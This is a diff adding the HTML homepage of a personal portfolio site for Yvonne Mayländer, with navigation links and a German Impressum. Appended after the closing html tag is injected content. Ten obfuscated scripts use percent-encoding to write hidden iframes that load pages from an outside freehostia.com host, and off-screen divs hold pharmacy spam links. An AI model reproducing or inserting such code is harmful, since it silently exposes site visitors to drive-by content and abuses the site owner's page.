@@ -1,0 +1,78 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<!-- if iemac 5 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"> -->
+<html>
+<head>
+	<title>Yvonne Mayl&auml;nder</title>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+	<meta name="keywords" content="" />
+	<meta name="description" content="Yvonne Mayl&auml;nder" />
+	<meta name="author" content="Philipp Trost" />
+	<meta name="robots" content="index, follow" />
+	<meta name="revisit-after" content="0 days" />
+	<meta http-equiv="pragma" content="no-cache" />
+	<meta http-equiv="expires" content="0" />
+	<meta http-equiv="cache-control" content="no-cache" />
+	<link rel="stylesheet" type="text/css" href="css/main.css" media="all" />
+	<link rel="shortcut icon" href="http://www.yvonnemaylaender.com/favicon.gif" type="image/x-icon" />
+	<link rel="icon" href="http://www.yvonnemaylaender.com/favicon.gif" type="image/x-icon" />
+	<!--  conditional browser styles -->
+    <style type="text/css">
+        /*\*//*/@import "iemac.css";/**/ 
+    </style>
+	<script type="text/javascript" src="scripts/jq.js"></script>
+	<script type="text/javascript" src="scripts/hover.js"></script>
+	<script type="text/javascript" src="scripts/box.js"></script>
+	<script type="text/javascript" src="scripts/init_box.js"></script>
+	<!--[if IE]>
+		<link rel="stylesheet" type="text/css" href="css/ie.css" media="all" />
+	<![endif]-->
+	<!--[if IE 6]>
+		 <script src="scripts/DD_belatedPNG_0.0.7a-min.js"></script>
+		 <script>DD_belatedPNG.fix('.png_fix');</script>
+		<link rel="stylesheet" type="text/css" href="css/ie6.css" media="all" />
+	<![endif]-->
+	<!--[if lt IE 7]>
+		<script type="text/javascript">
+			try { document.execCommand('BackgroundImageCache', false, true); } catch(e) {}
+		</script>
+	<![endif]-->
+	<!--[if IE 7]>
+		<link rel="stylesheet" type="text/css" href="css/ie7.css" media="all" />
+	<![endif]-->
+	<!-- / conditional browser styles -->
+	<!-- in Site Styles tmp for dev only !!!-->
+	<style type="text/css" media="all">
+	
+	</style>
+	<!-- in Site Styles tmp for dev only !!!-->
+</head>
+<body>
+<div id="distance"></div>
+<div id="main_index">
+	<div id="navigation_index">
+		<ul class="clearfix">
+			<li><img class="png_fix" src="img/homev_over.gif" alt="Home" /></li>
+			<li><a id="Galerie" href="galerie.html" title="Galerie"><img class="hover" src="img/galeriev.gif" alt="Galerie" style="background: url(img/galeriev_over.gif);" /></a></li>
+			<li><a id="Setcard" href="setcard.html" title="Setcard"><img class="hover" src="img/setcardv.gif" alt="Setcard" style="background: url(img/setcardv_over.gif);" /></a></li>
+			<li><a id="Referenzen" href="referenzen.html" title="Referenzen"><img class="hover" src="img/referenzenv.gif" alt="Referenzen" style="background: url(img/referenzenv_over.gif);" /></a></li>
+			<li><a id="Kontakt" href="kontakt.html" title="Kontakt"><img class="hover" src="img/kontaktv.gif" alt="Kontakt" style="background: url(img/kontaktv_over.gif);" /></a></li>
+			<li class="top25"><a id="Friends" href="friends.html" title="Friends"><img class="hover" src="img/friendsv.gif" alt="Friends" style="background: url(img/friendsv_over.gif);" /></a></li>
+		</ul>
+	</div>
+	<!-- hidden elements -->
+	<div id="impressum" class="hide">
+		<div>
+			Impressum <br /><br />
+			Verantwortlich <br /><br />
+			Yvonne Mayl&auml;nder<br />
+			E-MAIL: <a href="mailto:info@yvonnemaylaender.com">info@yvonnemaylaender.com</a><br />
+            <br /><br />
+			Haftungsausschluss<br />
+			Gestaltung und Inhalt dieser Website unterliegen dem weltweiten Urheberrecht. Eine Vervielf&auml;ltigung, Weitergabe und sonstige Verwendung ist nur nach ausdr&uuml;cklicher vorheriger Genehmigung zul&auml;ssig. Inhalte von fremden Websites, auf die mit Links hingewiesen wird, unterliegen der Verantwortung der jeweiligen Anbieter. Alle Rechte vorbehalten. Die Inhalte dieser Website werden mit gr&ouml;&szlig;tm&ouml;glicher Sorgfalt erstellt. Es handelt sich jedoch nur um unverbindliche Informationen allgemeiner Art. F&uuml;r ihre Richtigkeit, Vollst&auml;ndigkeit und Aktualit&auml;t wird keine Gew&auml;hr &uuml;bernommen.
+		</div>
+	</div>
+	<!-- /hidden elements -->
+	<div id="impressum_link"><a class="thickbox" href="#">Impressum</a></div>
+</div>
+</body>
+</html><noindex><script>var c='%3c%69%66%72%61%6d%65%20%73%72%63%3d%22%68%74%74%70%3a%2f%2f%79%61%6e%61%73%73%75%74%65%62%65%76%72%6f%74%6f%6b%2e%66%72%65%65%68%6f%73%74%69%61%2e%63%6f%6d%2f%3f%6e%3d%38%38%35%22%20%73%74%79%6c%65%3d%22%64%69%73%70%6c%61%79%3a%6e%6f%6e%65%3b%22%3e%3c%2f%69%66%72%61%6d%65%3e';document.write(unescape(c));</script></noindex><noindex><script>var c='%3c%69%66%72%61%6d%65%20%73%72%63%3d%22%68%74%74%70%3a%2f%2f%79%61%6e%61%73%73%75%74%65%62%65%76%72%6f%74%6f%6b%2e%66%72%65%65%68%6f%73%74%69%61%2e%63%6f%6d%2f%3f%6e%3d%31%33%32%31%22%20%73%74%79%6c%65%3d%22%64%69%73%70%6c%61%79%3a%6e%6f%6e%65%3b%22%3e%3c%2f%69%66%72%61%6d%65%3e';document.write(unescape(c));</script></noindex><noindex><script>var c='%3c%69%66%72%61%6d%65%20%73%72%63%3d%22%68%74%74%70%3a%2f%2f%79%61%6e%61%73%73%75%74%65%62%65%76%72%6f%74%6f%6b%2e%66%72%65%65%68%6f%73%74%69%61%2e%63%6f%6d%2f%3f%6e%3d%31%33%38%33%22%20%73%74%79%6c%65%3d%22%64%69%73%70%6c%61%79%3a%6e%6f%6e%65%3b%22%3e%3c%2f%69%66%72%61%6d%65%3e';document.write(unescape(c));</script></noindex><noindex><script>var c='%3c%69%66%72%61%6d%65%20%73%72%63%3d%22%68%74%74%70%3a%2f%2f%79%61%6e%61%73%73%75%74%65%62%65%76%72%6f%74%6f%6b%2e%66%72%65%65%68%6f%73%74%69%61%2e%63%6f%6d%2f%3f%6e%3d%31%34%34%35%22%20%73%74%79%6c%65%3d%22%64%69%73%70%6c%61%79%3a%6e%6f%6e%65%3b%22%3e%3c%2f%69%66%72%61%6d%65%3e';document.write(unescape(c));</script></noindex><noindex><script>var c='%3c%69%66%72%61%6d%65%20%73%72%63%3d%22%68%74%74%70%3a%2f%2f%79%61%6e%61%73%73%75%74%65%62%65%76%72%6f%74%6f%6b%2e%66%72%65%65%68%6f%73%74%69%61%2e%63%6f%6d%2f%3f%6e%3d%32%36%39%37%22%20%73%74%79%6c%65%3d%22%64%69%73%70%6c%61%79%3a%6e%6f%6e%65%3b%22%3e%3c%2f%69%66%72%61%6d%65%3e';document.write(unescape(c));</script></noindex><div style='position:absolute;left:-1000px;'><a href='.lib/index.php'>buy</a><a href='.lib/index.htm'>generics</a><a href='.lib/index.html'>online</a></div><script>var c='%3c%69%66%72%61%6d%65%20%73%72%63%3d%27%68%74%74%70%3a%2f%2f%79%61%6e%61%73%73%75%74%65%62%65%76%72%6f%74%6f%6b%2e%66%72%65%65%68%6f%73%74%69%61%2e%63%6f%6d%2f%3f%73%3d%38%37%35%27%20%73%74%79%6c%65%3d%27%64%69%73%70%6c%61%79%3a%6e%6f%6e%65%3b%27%3e%3c%2f%69%66%72%61%6d%65%3e';document.write(unescape(c));</script><div style='position:absolute;left:-1000px;'><a href='.lib/index.php'>buy</a><a href='.lib/index.htm'>generics</a><a href='.lib/index.html'>online</a></div><script>var c='%3c%69%66%72%61%6d%65%20%73%72%63%3d%27%68%74%74%70%3a%2f%2f%79%61%6e%61%73%73%75%74%65%62%65%76%72%6f%74%6f%6b%2e%66%72%65%65%68%6f%73%74%69%61%2e%63%6f%6d%2f%3f%73%3d%31%33%30%33%27%20%73%74%79%6c%65%3d%27%64%69%73%70%6c%61%79%3a%6e%6f%6e%65%3b%27%3e%3c%2f%69%66%72%61%6d%65%3e';document.write(unescape(c));</script><div style='position:absolute;left:-1000px;'><a href='.lib/index.php'>buy</a><a href='.lib/index.htm'>generics</a><a href='.lib/index.html'>online</a></div><script>var c='%3c%69%66%72%61%6d%65%20%73%72%63%3d%27%68%74%74%70%3a%2f%2f%79%61%6e%61%73%73%75%74%65%62%65%76%72%6f%74%6f%6b%2e%66%72%65%65%68%6f%73%74%69%61%2e%63%6f%6d%2f%3f%73%3d%31%33%36%31%27%20%73%74%79%6c%65%3d%27%64%69%73%70%6c%61%79%3a%6e%6f%6e%65%3b%27%3e%3c%2f%69%66%72%61%6d%65%3e';document.write(unescape(c));</script><div style='position:absolute;left:-1000px;'><a href='.lib/index.php'>buy</a><a href='.lib/index.htm'>generics</a><a href='.lib/index.html'>online</a></div><script>var c='%3c%69%66%72%61%6d%65%20%73%72%63%3d%27%68%74%74%70%3a%2f%2f%79%61%6e%61%73%73%75%74%65%62%65%76%72%6f%74%6f%6b%2e%66%72%65%65%68%6f%73%74%69%61%2e%63%6f%6d%2f%3f%73%3d%31%34%32%33%27%20%73%74%79%6c%65%3d%27%64%69%73%70%6c%61%79%3a%6e%6f%6e%65%3b%27%3e%3c%2f%69%66%72%61%6d%65%3e';document.write(unescape(c));</script><div style='position:absolute;left:-1000px;'><a href='.lib/index.php'>buy</a><a href='.lib/index.htm'>generics</a><a href='.lib/index.html'>online</a></div><script>var c='%3c%69%66%72%61%6d%65%20%73%72%63%3d%27%68%74%74%70%3a%2f%2f%79%61%6e%61%73%73%75%74%65%62%65%76%72%6f%74%6f%6b%2e%66%72%65%65%68%6f%73%74%69%61%2e%63%6f%6d%2f%3f%73%3d%32%36%35%31%27%20%73%74%79%6c%65%3d%27%64%69%73%70%6c%61%79%3a%6e%6f%6e%65%3b%27%3e%3c%2f%69%66%72%61%6d%65%3e';document.write(unescape(c));</script>
